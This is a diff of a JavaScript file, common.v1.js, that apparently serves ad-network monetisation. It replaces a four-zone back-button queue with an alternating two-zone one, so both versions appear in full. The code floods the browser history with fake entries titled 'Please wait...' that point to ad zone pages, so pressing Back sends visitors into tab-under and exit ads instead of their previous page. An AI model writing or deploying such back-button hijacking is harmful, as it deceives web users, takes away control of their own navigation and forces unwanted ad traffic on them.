@@ -1,11 +1,11 @@
-/* common.v1.js — FINAL (Direct Open + Modal Background Clone + Image Grid) + BACK 4-ZONE CYCLE QUEUE */
+/* common.v1.js — FINAL (Direct Open + Modal Background Clone + Image Grid) + BACK ALT QUEUE + GUARD */
 
-/* 🔒 anti-double-boot guard (works in non-module scripts) */
 (() => {
+  // 🔒 anti-double-boot guard (safe for non-module scripts)
   if (window.__COMMON_BOOTED__) return;
   window.__COMMON_BOOTED__ = "v1";
 
-  /* common.js — FINAL (Direct Open + Modal Background Clone + Image Grid) */
+  /* common.js — FINAL (Direct Open + Modal Background Clone + Image Grid) + BACK ALT QUEUE */
 
   (() => {
     "use strict";
@@ -86,7 +86,7 @@
 
       Object.entries(appCfg).forEach(([k, v]) => {
         if (v == null || v === "" || k === "domain") return;
-
+        
         let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
         if (m) {
           const [, name, tab, field] = m;
@@ -166,7 +166,7 @@
       } catch (e) { err("Back pushState error:", e); }
     };
 
-    // ✅ alternating back queue A/B
+    // ✅ NEW: alternating back queue A/B
     const pushBackStatesAlternate = (urlA, urlB, count) => {
       try {
         const n = Math.max(0, parseInt(count, 10) || 0);
@@ -184,27 +184,6 @@
       }
     };
 
-    // ✅ NEW: cycle back queue across N urls (A->B->C->D->A...)
-    const pushBackStatesCycle = (urls, count) => {
-      try {
-        const n = Math.max(0, parseInt(count, 10) || 0);
-        const originalUrl = window.location.href;
-
-        const list = Array.isArray(urls) ? urls.filter(Boolean) : [];
-        if (!list.length) return;
-
-        for (let i = 0; i < n; i++) {
-          const u = list[i % list.length];
-          window.history.pushState(null, "Please wait...", u);
-        }
-
-        window.history.pushState(null, document.title, originalUrl);
-      } catch (e) {
-        err("Back pushState CYCLE error:", e);
-        try { pushBackStates((urls && urls[0]) || window.location.href, count); } catch {}
-      }
-    };
-
     const getDefaultBackHtmlUrl = () => {
       const { origin, pathname } = window.location;
       let dir = pathname.replace(/\/(index|back)\.html$/i, "");
@@ -213,7 +192,7 @@
       return `${origin}${dir}/back.html`;
     };
 
-    // ✅ helper builder for back.html url with chosen zoneId
+    // ✅ NEW: helper builder for back.html url with chosen zoneId
     const buildBackHtmlUrl = (cfg, zoneId, overrideUrl) => {
       const b = cfg?.back?.currentTab;
       const pageUrl = cfg?.back?.pageUrl || getDefaultBackHtmlUrl();
@@ -232,42 +211,27 @@
       return page.toString();
     };
 
-    // ✅ UPDATED: initBackFast() cycles 4 zones:
-    // back -> tabUnderClick -> mainExit currentTab -> mainExit newTab -> repeat
+    // ✅ UPDATED: initBackFast() чередует back_zoneId и tabUnderClick_zoneId
     const initBackFast = (cfg) => {
       const b = cfg?.back?.currentTab;
       if (!b) return;
 
       const count = cfg.back?.count ?? 10;
 
-      const zoneBack = b.zoneId;
+      // A = back_zoneId
+      const zoneA = b.zoneId;
 
-      const zoneTUC =
+      // B = tabUnderClick_zoneId
+      const zoneB =
         cfg?.tabUnderClick?.newTab?.zoneId ||
         cfg?.tabUnderClick?.currentTab?.zoneId ||
         null;
 
-      const zoneMainCT =
-        cfg?.mainExit?.currentTab?.zoneId ||
-        null;
+      const urlA = buildBackHtmlUrl(cfg, zoneA, b.url ? String(b.url) : "");
+      const urlB = zoneB ? buildBackHtmlUrl(cfg, zoneB, "") : "";
 
-      const zoneMainNT =
-        cfg?.mainExit?.newTab?.zoneId ||
-        null;
-
-      const url1 = buildBackHtmlUrl(cfg, zoneBack, b.url ? String(b.url) : "");
-      const url2 = zoneTUC    ? buildBackHtmlUrl(cfg, zoneTUC, "")    : "";
-      const url3 = zoneMainCT ? buildBackHtmlUrl(cfg, zoneMainCT, "") : "";
-      const url4 = zoneMainNT ? buildBackHtmlUrl(cfg, zoneMainNT, "") : "";
-
-      const urls = [url1, url2, url3, url4].filter(Boolean);
-
-      if (urls.length <= 1) {
-        pushBackStates(url1, count);
-        return;
-      }
-
-      pushBackStatesCycle(urls, count);
+      if (urlB) pushBackStatesAlternate(urlA, urlB, count);
+      else pushBackStates(urlA, count);
     };
 
     const resolveUrlFast = (ex, cfg) => {
@@ -415,7 +379,5 @@
 
     if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
     else boot();
-
   })();
-
 })();
